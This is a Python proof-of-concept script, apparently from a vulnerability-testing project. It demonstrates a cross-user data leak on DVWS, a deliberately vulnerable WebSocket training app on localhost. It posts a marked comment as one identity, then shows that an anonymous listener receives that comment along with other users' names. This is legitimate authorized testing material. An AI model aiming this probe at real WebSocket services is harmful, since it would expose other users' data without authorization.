#!/usr/bin/env python3
"""DVWS manual cross-user proof (authorized training target, 127.0.0.1 only).

The SENTINEL WebSocket engine records websocket/cross-user as UNTESTABLE on
DVWS: its identity model rides HTTP form/token authz accounts, and DVWS
authenticates over WebSocket itself. This manual proof substitutes the
marker-proven evidence the engine cannot structurally produce:

  1. post a MARKER comment through /post-comments as identity "admin-probe"
  2. connect to /show-comments as a FRESH, credential-less listener
  3. prove the marker (another identity's data) is broadcast to it
"""
import json
import time

from sentinel.websocket import WsClient

WS = "ws://127.0.0.1:8080"
MARKER = "XUSER-MARKER-7Q4Z-CONTENT"

out = {"target": WS, "proof": "cross-user channel broadcast, marker-proven"}

# 1. post the marked comment as identity "admin-probe"
c1 = WsClient(WS + "/post-comments", timeout=6.0)
assert c1.connect(), "post-comments handshake failed"
c1.send_text(json.dumps({"name": "admin-probe", "comment": MARKER}))
post_reply = c1.listen(seconds=2.0, max_messages=2)
c1.close()
out["post_reply"] = [m.get("text", "")[:160] for m in post_reply]

# 2. fresh anonymous listener on /show-comments
c2 = WsClient(WS + "/show-comments", timeout=6.0)
assert c2.connect(), "show-comments handshake failed"
c2.send_text("{}")
dump = c2.listen(seconds=3.0, max_messages=4)
c2.close()
texts = [m.get("text", "") for m in dump if m.get("opcode") == "text"]
out["listener_reply_bytes"] = sum(len(t) for t in texts)
out["marker_received_by_anonymous_listener"] = any(MARKER in t for t in texts)
out["other_users_data_seen"] = sorted({
    t.split("Name: ")[1].split("<br>")[0]
    for t in texts if "Name: " in t})

print(json.dumps(out, indent=1))
json.dump(out, open("/home/z/my-project/gap-validation/results/"
                    "dvws_cross_user_proof.json", "w"), indent=1)
assert out["marker_received_by_anonymous_listener"], \
    "marker NOT received — proof failed"
print("\nPROOF: the marker comment posted by 'admin-probe' was broadcast to a "
      "credential-less listener together with every other user's comments.")
